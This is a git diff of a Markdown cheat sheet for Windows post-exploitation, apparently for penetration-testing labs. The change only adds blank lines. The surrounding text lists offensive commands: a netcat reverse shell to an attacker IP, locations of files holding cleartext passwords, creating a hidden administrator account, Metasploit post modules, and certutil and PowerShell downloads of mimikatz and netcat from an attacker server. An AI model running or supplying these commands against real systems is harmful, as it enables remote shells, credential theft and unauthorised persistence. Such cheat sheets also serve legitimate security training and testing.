@@ -70,6 +70,7 @@ route print
 ```
 
 __Looking for cleartext passwords?__
+
 ```
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
@@ -111,6 +112,7 @@ Invoke-Command -Session $Session  -ScriptBlock { nc.exe -e cmd.exe 10.10.10.17 4
 ```
 
 ### Adding users
+
 Quickly add a user to the system. If admin privs are also acquired, add the user to the admin group. 
 ```
 net user appel Welkom01 /add
@@ -118,6 +120,7 @@ net localgroup administrators appel /add
 ```
 
 #### MSF Post modules Windows
+
 If you ever use a MSF, here are some usefull post modules. 
 ```
 use exploit/windows/local/service_permissions
@@ -132,7 +135,9 @@ run post/windows/gather/checkvm
 ```
 
 #### Transfering files
+
 __Kali__
+
 Set up simple webserver using python. 
 ```
 python3 -m http.server 80
@@ -140,6 +145,7 @@ python3 -m http.server 80
 
 
 __CMD__
+
 Use cmd to download files. 
 ``` 
 certutil -urlcache -split -f "http://10.10.10.17/mimikatz.exe" mim.exe
@@ -147,6 +153,7 @@ certutil.exe -urlcache -split -f "http://10.10.10.17/mimikatz.exe" %TMP%\mim.exe
 ``` 
 
 __Powershell__
+
 Use Powershell to download files. 
 ```
 powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')
@@ -159,6 +166,7 @@ powershell -c -e {base64}
 ``` 
 
 __SMB__
+
 Set up smb share to copy files.
 ```
 kali) 	python /usr/share/doc/python-impacket/examples/smbserver.py APPEL /tmp/APPEL
@@ -174,6 +182,7 @@ Wind) 	net view \\10.10.10.158
 ```
 
 #### Mounting shares
+
 cmd stuff
 
 ```
@@ -190,7 +199,9 @@ net use Y: \\127.0.0.1\C$
 
 
 #### Processes for current user
+
 __Powershell__
+
 ```
 get-process
 ```
